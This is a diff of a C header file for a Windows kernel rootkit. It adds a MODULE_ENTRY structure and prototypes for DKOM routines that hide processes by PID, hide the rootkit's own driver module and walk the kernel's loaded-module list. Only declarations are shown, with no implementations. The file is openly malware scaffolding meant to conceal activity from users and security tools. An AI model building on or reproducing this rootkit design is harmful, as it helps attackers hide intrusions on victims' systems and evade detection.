@@ -4,13 +4,19 @@
 #include <ntddk.h>
 #include "rootkit.h"
 
-BOOLEAN OnProcessHide(IN ULONG pid);
-ULONG FindProcessEPROCByPid( int terminate_PID );
-ULONG FindProcessEPROCByName(char procName[]);
-VOID DKOM_HideProcess( PEPROCESS eproces );
-BOOLEAN HideRootkitModule();
-ULONG GetModuleListBegin (IN PDRIVER_OBJECT  DriverObject);
-PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName);
+typedef struct _MODULE_ENTRY {
+	LIST_ENTRY le_mod;
+	ULONG  unknown[4];
+	ULONG  base;
+	ULONG  driver_start;
+	ULONG  unk1;
+	UNICODE_STRING driver_Path;
+	UNICODE_STRING driver_Name;
+} MODULE_ENTRY, *PMODULE_ENTRY;
 
+BOOLEAN DKOM_OnProcessHide(ULONG pid);
+VOID DKOM_HideProcess( PEPROCESS eproces );
+BOOLEAN DKOM_HideRootkitModule();
+ULONG DKOM_GetModuleListBegin (PDRIVER_OBJECT  DriverObject);
 
 #endif
